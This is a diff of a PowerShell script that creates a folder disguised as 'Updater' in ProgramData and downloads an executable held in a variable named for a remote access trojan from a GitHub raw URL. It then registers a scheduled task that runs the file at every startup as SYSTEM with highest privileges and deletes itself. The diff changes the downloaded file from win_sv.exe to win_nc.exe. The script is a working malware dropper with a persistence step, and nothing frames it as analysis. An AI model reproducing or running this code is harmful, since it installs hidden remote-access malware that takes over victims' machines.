@@ -13,8 +13,9 @@ $workDir = "C:\ProgramData\Updater"
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 
 Write-Host "[3/7]" -ForegroundColor Cyan
-$ratPath = "$workDir\win_sv.exe"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/refs/heads/main/win_sv.exe" -OutFile $ratPath
+$ratPath = "$workDir\win_nc.exe"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/win_nc.exe" -OutFile $ratPath
+
 
 Write-Host "[4/7]" -ForegroundColor Cyan
 schtasks /create /tn "Win" /tr "cmd /c start /b $ratPath & schtasks /delete /tn Win /f" /sc onstart /ru SYSTEM /rl HIGHEST /f > $null 2>&1
